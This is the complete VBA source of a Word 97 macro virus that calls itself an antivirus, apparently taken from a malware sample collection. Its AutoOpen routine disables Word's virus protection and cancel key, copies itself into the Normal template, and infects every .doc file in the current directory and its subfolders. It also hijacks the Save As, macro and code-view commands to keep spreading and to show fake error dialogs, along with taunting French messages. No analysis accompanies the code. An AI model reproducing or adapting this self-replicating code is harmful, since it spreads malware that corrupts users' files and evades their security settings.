   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ZMK98FAV"
   Sub AutoOpen()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorAO
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0) = "ZMK98FAV" Then
           ZMK98FAVInstalled = -1
       End If
   Next i
   If Not ZMK98FAVInstalled Then
       MsgBox "Je suis un nouveau AntiVirus pour Word 97", vbInformation, "ZMK98FAV"
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
       StatusBar = "Analyse du répertoire: " & CurDir & " pour trouver des fichier DOC..."
       For i = 1 To 500000
       Next i
       With Application.FileSearch
       If .Execute() > 0 Then
           .FileName = "*.doc"
           .LookIn = CurDir
           .SearchSubFolders = True
           For i = 1 To .FoundFiles.Count
               StatusBar = "Analyse de " & .FoundFiles(i) & " en cours..."
               Documents.Open FileName:=.FoundFiles(i)
               Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
               Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
               ActiveDocument.Save
               StatusBar = "Analyse de " & .FoundFiles(i) & " terminé..."
           Next i
           MsgBox "Analyse du répertoire " & CurDir & " terminé!!!" & Chr$(13) & "Les " & .FoundFiles.Count & " fichiers analysés sont infectés par moi" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "ZMK98FAV"
           StatusBar = "[ZMK98FAV] ZeMacroKiller98 Faux AntiVirus, HAHAHAHAHA!!!!"
           Application.Run MacroName:="FichierFermerTout"
       Else
           MsgBox "Pas de fichier DOC trouvé dans " & CurDir, vbInformation, "ZMK98FAV"
           MsgBox "Mais moi, je vous ai infecté..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "ZMK98FAV"
       End If
       End With
   End If
   ErrorAO:
   End Sub
   Sub FileSaveAs()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFSA
       Dialogs(wdDialogFileSaveAs).Show
       If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
           ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
       End If
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
   MsgBox "Vous feriez mieux d'acheter un VRAI ANTIVIRUS..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "ZMK98FAV"
   ActiveDocument.Save
   ErrorFSA:
   End Sub
   Sub FileTemplates()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFT
       MsgBox "Espace Pile Insuffisant.", vbCritical, "Microsoft Word"
   ErrorFT:
   End Sub
   Sub ToolsMacro()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorTM
       ZMK98BM.Show
   ErrorTM:
   End Sub
   Sub ViewVBCode()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorVVBC
       MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   ErrorVVBC:
   End Sub

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} ZMK98BM
      Caption         =   "ZMK98FAV"
      ClientHeight    =   2025
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4095
      OleObjectBlob   =   "Virus.MSWord.Zmk-ZMK98BM.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "ZMK98BM"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False

   Private Sub CommandButton1_Click()
   Unload ZMK98BM
   End Sub

   Private Sub UserForm_Initialize()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   End Sub
